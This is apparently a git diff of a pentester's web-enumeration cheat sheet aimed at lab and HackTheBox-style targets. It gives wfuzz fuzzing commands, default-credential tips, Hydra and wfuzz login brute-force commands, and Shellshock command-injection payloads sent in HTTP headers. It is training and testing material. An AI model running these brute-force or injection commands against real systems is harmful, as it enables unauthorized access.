@@ -28,15 +28,19 @@ whatweb --color=never --no-errors -a 3 -v https://10.0.0.42:443
 **Google the server name and version for vulnerabilites. Do the same for found scripting engines (PHP version, etc.)**
 
 ## Dir Fuzzing
+```bash
+# 404 based
+wfuzz -Z -c -w <wordlist_no_extensions> -w <wordlist_extensions> --hc 404 http://10.10.10.13/FUZZFUZ2Z
 
+# response size based (number words)
+wfuzz -Z -c -w <wordlist_no_extensions> -w <wordlist_extensions> --hw 42 http://10.10.10.13/FUZZFUZ2Z
+```
 
-
-
-
+See the wordlist cheatsheet for wordlists.
 
 ## Subdomain Fuzzing
 
-If you know (or figured out) the host name, then you can look for subdomains that serve different content.
+If you know the hostname, then you can look for subdomains that serve different content.
 
 ```default
 wfuzz -c -Z -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H "Host: FUZZ.host.com" --hc 200 --hw 356 -t 100 10.10.10.101
@@ -44,39 +48,91 @@ wfuzz -c -Z -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-mediu
 
 ## Login Forms
 
-* admin:admin
-* admin:password
-* Check for SQL Injections
-* Google for default credentials (If you know what it is) 
-* Check for "username is wrong" type info leaks
-* Search for possible usernames on the wider site ("About Us" pages, ssl cert, etc.)
+Like always google for exploits if you know the name of the webapp. Knowing the exact version helps as well, check sourcecode and HTTP response.
 
-If you can create a low privilege user, then do so. It helps figuring out the rules of the system like username format, password requirements, etc. Also even low priv users sometimes can see sensitive data.
+1. Try `admin:admin`
+2. Try `admin:password`
+3. Try `admin:<application_name>`
+4. Check for SQL Injections
+5. Google for default credentials (If you know the name of the webapp) 
+6. Check for "username is wrong" type info leaks
+7. Search for possible usernames on the wider site ("About Us", ssl cert, etc.)
+8. Try to create a low privilege user. Enumerate username-format, password requirements, etc. Also even low priv users sometimes can see sensitive data.
+9. Check password reset rules
 
-Also logged in users might have access to vulnerable parts of the website that are otherwise not visible.
-
+If you managed to create a low privilege user, make sure to check newly accessible pages and params for vulns.
 
 ### Login Bruteforcing
 
-This is inherently dangerous because it might (1.) blacklist your IP address after too many failed attempts and (2.) it might DoS the target server. So this should be seen as a last resort.
+This is inherently dangerous because it might (1.) blacklist your IP address after too many failed attempts and (2.) it might DoS the target server. So this should be seen as a **last resort**.
 
-If you do not know some confirmed usernames, then this might take forever. If you really have no clue, then it is advised that you limit the tested usernames to a small set of very common names like "admin", "Administrator", etc. 
+If you do not know some confirmed usernames, then this might take forever. If you really have no clue, then it is advised that you limit the tested usernames to a small set of very common names like "admin", "Administrator", "john", etc. 
 
 It also helps if you know the required username format. For instance if usernames are all email addresses, then you should obviously only test email addresses. Preferably email addresses at the same domain as the website.
 
+#### With Hydra:
 
+```bash
+# HTTP Post Form
+hydra -L usernames.txt -P passwords.txt 192.168.2.62 http-post-form “/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed”
 
+# HTTP Basic Auth
+hydra -L usernames.txt -P passwords.txt sizzle.htb.local http-get /certsrv/
+```
 
+#### With WFuzz:
 
+See the dedicated WFuzz cheatsheet for more details.
 
+Make sure to set threads to 1 like in the command here or you won't see which password actually worked.
+```bash
+-t 1 # number of threads
+-d 'username=admin&password=FUZZ' # post data
+-H # header
+-Z # ignore errors
+-c # color output
+-w # wordlist (supply these in order of the placeholders)
+--hc 400,404 # hide response by response code
+--hh 1337 # hide by character count
+--hw 42 # hide by word count
+```
+```bash
+# x-www-form-urlencoded
+wfuzz -Z -c -w passwords.txt -d 'username=admin&password=FUZZ' --hw 221 -H "Cookie: PHPSESSID=in8btt8pahv74vebe6ctsuj4u3" -H "Content-Type: application/x-www-form-urlencoded" -p localhost:8080 http://admin.cronos.htb/
 
+# JSON
+wfuzz -Z -c -w passwords.txt -d '{username:admin,password:FUZZ}' --hw 221 -H "Cookie: PHPSESSID=in8btt8pahv74vebe6ctsuj4u3" -H "Content-Type: application/json" -p localhost:8080 http://admin.cronos.htb/
+```
+
+You can see if it works as intended by setting the proxy to burp:
+```bash
+-p localhost:8080
+```
 
 ## Common Vulns
+
+### LFI / RFI
+
+See the dedicated LFI / RFI cheatsheet.
+
+### Wordpress, Drupal, etc.
+
+See the dedicated Wordpress cheatsheet.
+
+All of these CMS' tend to have a ton of vulns, especially in plugins. There are scanners for all of the big ones.
+
+### IIS
+
+A boatload. Check the link (also google for more):
+
+https://book.hacktricks.xyz/pentesting/pentesting-web/iis-internet-information-services
+
+
 ### Shellshock
 
 If you found a `/cgi-bin/` directory or if you know shell script files are getting interpreted and the output served via HTTP, then you should look for shellshock. 
 
-Nmap has a detection script (covered by the command above), but it is notoriously unreliable. A manual test might be necessary.
+Nmap has a detection script (covered by the command above), but it is notoriously unreliable and it requires a complete path to a target file, so it doesn't work automatically. A manual test is usually necessary.
 
 Fuzz for script files:
 ```default
@@ -95,7 +151,13 @@ Wordlist for common script extensions:
 .jsp
 .pl
 .rb
+.php
+.asp
+.aspx
+.bat
 ```
+
+I am not 100% sure which interpreted script files can actually be used for shellshock, so I usually just use the list above (which I stole from somewhere idk) and hope for the best.
 
 If you found an interpreted script file, then the basic test looks like this:
 
@@ -115,6 +177,8 @@ Upgrade-Insecure-Requests: 1
 
 Shellshock gets triggered by: `() { :;}; echo; /bin/bash -c "ls /usr/bin"`
 
+The reason why we add that one echo at the start is because the first output tends to get eaten and not printed.
+
 Also test the other headers, not just User-Agent.
 
 ```default
@@ -127,5 +191,12 @@ Accept: */*
 
 ```
 
+If there is no output printed, try to ping your own machine: 
+```default
+() { :;}; echo; /bin/bash -c "/bin/ping -c 4 10.0.0.222"
+() { :;}; echo; /bin/ping -c 4 10.0.0.222
+```
 
-If there is no output printed, try to ping your own machine.
+Make sure to add the `-c <num>` flag to the ping command or you will get spammed by ICMP endlessly.
+
+Confirm the pings with Wireshark.
